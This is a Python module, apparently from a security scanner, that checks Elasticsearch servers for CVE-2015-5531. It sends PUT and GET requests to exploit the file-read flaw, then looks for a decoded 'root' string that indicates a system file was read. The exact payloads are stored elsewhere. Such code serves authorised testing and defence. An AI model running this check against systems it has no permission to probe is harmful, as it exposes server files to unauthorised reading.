#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep

def cve_2015_5531_scan(self, url):
    ''' elasticsearch 1.5.1及以前, 无需任何配置即可触发该漏洞; 
        之后的新版, 配置文件elasticsearch.yml中必须存在path.repo, 该配置值为一个目录, 且该目录必须可写, 
        等于限制了备份仓库的根位置, 不配置该值, 默认不启动这个功能
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'FileRead'
    vul_info['vul_id'] = 'CVE-2015-5531'
    # vul_info['vul_method'] = 'PUT/GET'
    vul_info['vul_method'] = 'GET'

    for payload in range(len(self.cve_2015_5531_payloads)):
        # path = payload['path']
        # data = payload['data']
        # headers = payload['headers']

        path = self.cve_2015_5531_payloads[payload]['path']
        data = self.cve_2015_5531_payloads[payload]['data']
        headers = self.cve_2015_5531_payloads[payload]['headers']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            if (payload in [0, 1]):
                res = requests.put(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
                continue

            # elif payload == 2
            sleep(0.5)
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            if (res.status_code == 400
                and ('114, 111, 111, 116' in res.text)
                and ('Failed to derive' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Decode': 'ASCII decimal encode',
                        'Decode-Url': 'https://www.qqxiuzi.cn/bianma/ascii.htm'
                    },
                    'Request': res
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
